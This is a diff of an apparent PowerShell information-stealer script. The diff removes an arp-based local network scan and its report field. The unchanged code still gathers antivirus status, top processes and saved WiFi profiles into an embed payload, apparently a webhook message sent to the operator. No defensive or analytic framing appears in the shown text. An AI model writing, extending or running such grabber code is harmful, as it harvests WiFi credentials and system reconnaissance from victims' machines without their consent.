@@ -26,10 +26,6 @@ $AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProdu
 if (!$AV) { $AV = "None/Unknown" }
 $TopProcs = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -ExpandProperty Name) -join ", "
 
-# Local Network Scan
-$LocalMap = arp -a | Select-String "dynamic" | Select-Object -First 5 | Out-String
-if (!$LocalMap) { $LocalMap = "No neighbors found" }
-
 # WiFi Extraction
 $WiFi = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
     $name = $_.Matches.Groups[1].Value.Trim()
@@ -67,7 +63,6 @@ $Payload = @{
             @{ name = "Security Status"; value = "AV: **$AV**"; inline = $false }
             @{ name = "Top Processes (CPU)"; value = "``$TopProcs``"; inline = $false }
             @{ name = "Saved WiFi Networks"; value = "```" + $WiFiCut + "```"; inline = $false }
-            @{ name = "Local Network Neighbors"; value = "```" + $MapCut + "```"; inline = $false }
         )
     })
 }
